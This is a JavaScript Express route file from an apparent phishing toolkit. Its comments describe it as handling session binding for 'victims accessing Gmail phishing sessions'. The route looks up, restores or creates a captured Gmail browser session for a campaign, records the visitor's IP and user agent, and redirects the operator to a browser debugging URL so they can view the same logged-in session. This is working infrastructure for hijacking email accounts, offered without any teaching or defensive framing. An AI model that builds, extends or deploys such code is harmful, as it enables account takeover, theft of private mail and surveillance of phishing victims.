const express = require('express');
const router = express.Router();
const db = require('../database');

/**
 * Gmail Session Binding Routes
 * Handles session binding for victims accessing Gmail phishing sessions
 */

// Get gmail browser service reference
let gmailBrowserService = null;

// Initialize service reference
const initService = (service) => {
  gmailBrowserService = service;
};

// Handle Gmail browser session routing for phishing victims
router.get('/gmail-browser/:sessionToken', async (req, res) => {
  const { sessionToken } = req.params;
  const trackingId = req.query._fstrike_track || '';

  try {
    console.log(`🎯 Gmail bind URL accessed: ${sessionToken}`);

    if (!gmailBrowserService) {
      return res.status(500).send('<html><body><h3>Service Not Available</h3><p>Gmail browser service not initialized</p></body></html>');
    }

    // 1. Check if session is already active in memory
    const activeSession = gmailBrowserService.getSessionInfo(sessionToken);
    
    if (activeSession && activeSession.isActive) {
      console.log(`✅ Found active session: ${sessionToken}`);
      
      // Get the debugging URL from session data
      const sessionData = gmailBrowserService.activeSessions.get(sessionToken);
      if (sessionData && sessionData.debuggingUrl) {
        console.log(`🔗 Redirecting to debugging URL: ${sessionData.debuggingUrl}`);
        return res.redirect(sessionData.debuggingUrl);
      } else {
        // Show session viewer page instead of redirecting to localhost
        return res.send(`
          <!DOCTYPE html>
          <html>
          <head>
            <title>Gmail Session - Active</title>
            <style>
              body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f8f9fa; }
              .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
              .success { color: #27ae60; margin-bottom: 30px; }
              .info { background: #e8f4fd; padding: 20px; border-radius: 5px; margin: 20px 0; border-left: 4px solid #1a73e8; }
              .session-info { text-align: left; margin: 20px 0; }
              .session-info strong { color: #333; }
              .btn { background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px 5px; }
              .btn:hover { background: #1557b0; }
              .status { background: #27ae60; color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px; }
            </style>
          </head>
          <body>
            <div class="container">
              <h1 class="success">✅ Connected to Active Gmail Session</h1>
              <div class="info">
                <div class="session-info">
                  <p><strong>Session Token:</strong> ${sessionToken}</p>
                  <p><strong>Tracking ID:</strong> ${trackingId}</p>
                  <p><strong>Status:</strong> <span class="status">Active and Ready</span></p>
                  <p><strong>Current URL:</strong> ${activeSession.currentUrl || 'Gmail'}</p>
                  <p><strong>Viewers:</strong> ${activeSession.viewerCount}</p>
                </div>
                <p>This session is currently active and connected to Gmail. You are now viewing the same browser session.</p>
              </div>
              
              ${sessionData?.debuggingUrl ? `
                <a href="${sessionData.debuggingUrl}" class="btn" target="_blank">Open Browser DevTools</a>
              ` : ''}
              
              <button class="btn" onclick="location.reload()">Refresh Status</button>
            </div>
            
            <script>
              // Auto-refresh every 30 seconds to keep session alive
              setInterval(() => {
                fetch(window.location.href, { method: 'HEAD' }).catch(console.error);
              }, 30000);
            </script>
          </body>
          </html>
        `);
      }
    }

    // 2. Check database for session record (GmailBrowserSessions table)
    const record = await new Promise((resolve, reject) => {
      db.get("SELECT * FROM GmailBrowserSessions WHERE session_token = ?", [sessionToken], (err, row) => {
        if (err) return reject(err);
        resolve(row);
      });
    });
    
    if (!record) {
      console.log(`❌ Session not found in database: ${sessionToken}`);
      return res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>Session Not Found</title>
          <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f8f9fa; }
            .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .error { color: #d73527; }
          </style>
        </head>
        <body>
          <div class="container">
            <h1 class="error">❌ Session Not Found</h1>
            <p>The requested Gmail session could not be found or has expired.</p>
            <p><strong>Session:</strong> ${sessionToken}</p>
          </div>
        </body>
        </html>
      `);
    }

    // 3. Attempt to restore session
    console.log(`🔄 Attempting to restore session: ${sessionToken}`);
    let restoredInfo;
    
    try {
      restoredInfo = await gmailBrowserService.restoreGmailSession(sessionToken, record.campaign_id, {
        ip: req.ip,
        userAgent: req.get('User-Agent'),
        timestamp: new Date()
      });
    } catch (e) {
      console.error('Restore failed, creating fresh session fallback:', e.message);
      restoredInfo = await gmailBrowserService.createGmailSession(sessionToken, record.campaign_id, { 
        ip: req.ip, 
        userAgent: req.get('User-Agent') 
      });
    }

    console.log(`✅ Session restored/created: ${sessionToken}`);

    // 4. Redirect to debugging URL if available, otherwise show session info
    if (restoredInfo.debuggingUrl) {
      console.log(`🔗 Redirecting to debugging URL: ${restoredInfo.debuggingUrl}`);
      return res.redirect(restoredInfo.debuggingUrl);
    }

    // Show restored session page
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Gmail Session - Restored</title>
        <style>
          body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f8f9fa; }
          .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
          .success { color: #27ae60; margin-bottom: 30px; }
          .info { background: #fff3cd; padding: 20px; border-radius: 5px; margin: 20px 0; border-left: 4px solid #ffc107; }
          .session-info { text-align: left; margin: 20px 0; }
          .session-info strong { color: #333; }
          .btn { background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px 5px; }
          .btn:hover { background: #1557b0; }
          .status { background: #ffc107; color: #212529; padding: 4px 12px; border-radius: 12px; font-size: 12px; }
        </style>
      </head>
      <body>
        <div class="container">
          <h1 class="success">🔄 Gmail Session Restored</h1>
          <div class="info">
            <div class="session-info">
              <p><strong>Session Token:</strong> ${sessionToken}</p>
              <p><strong>Tracking ID:</strong> ${trackingId}</p>
              <p><strong>Status:</strong> <span class="status">${restoredInfo.isRestored ? 'Restored from Previous State' : 'Active'}</span></p>
              <p><strong>Current URL:</strong> ${restoredInfo.url}</p>
            </div>
            <p>You are now connected to the preserved Gmail session.</p>
          </div>
          
          <button class="btn" onclick="location.reload()">Refresh Session</button>
        </div>
        
        <script>
          // Auto-refresh every 30 seconds to keep session alive
          setInterval(() => {
            fetch(window.location.href, { method: 'HEAD' }).catch(console.error);
          }, 30000);
        </script>
      </body>
      </html>
    `);

  } catch (err) {
    console.error('Gmail bind route error:', err);
    return res.status(500).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Internal Error</title>
        <style>
          body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f8f9fa; }
          .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
          .error { color: #d73527; }
        </style>
      </head>
      <body>
        <div class="container">
          <h1 class="error">⚠️ Internal Error</h1>
          <p>An error occurred while processing your request.</p>
          <p><strong>Session:</strong> ${sessionToken}</p>
          <button onclick="location.reload()" style="background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer;">Try Again</button>
        </div>
      </body>
      </html>
    `);
  }
});

module.exports = { router, initService };
